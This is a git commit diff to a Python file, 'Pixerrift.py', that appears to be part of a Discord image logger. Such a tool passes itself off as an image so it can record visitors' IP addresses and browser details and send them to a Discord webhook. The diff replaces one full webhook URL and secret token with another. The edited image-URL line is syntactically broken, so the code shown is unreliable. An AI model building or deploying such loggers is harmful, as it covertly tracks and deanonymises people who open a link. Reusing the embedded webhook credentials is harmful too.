2e1bc4965af228ea8d4eaddfce26cc72eb21c842
sisidjf <princetiktok687@gmail.com>
2025-06-02 18:35:35 +1200

    Update Pixerrift.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1378979756954882048/Xb3K9CJybc-uB3gtB54HrUsxbysVwrTzEghgHNoJmFt4qxA8wy-7zHMGRpmU1MRD8j35-'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = https://static.vecteezy.com/system/resources/previews/039/212/771/large_2x/closeup-sand-sea-waves-beach-beautiful-panoramic-landscape-inspire-tropical-seascape-horizon-peace-sunset-sky-calm-tranquil-relax-panorama-positive-energy-meditation-summer-tropical-island-photo.jpg).content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
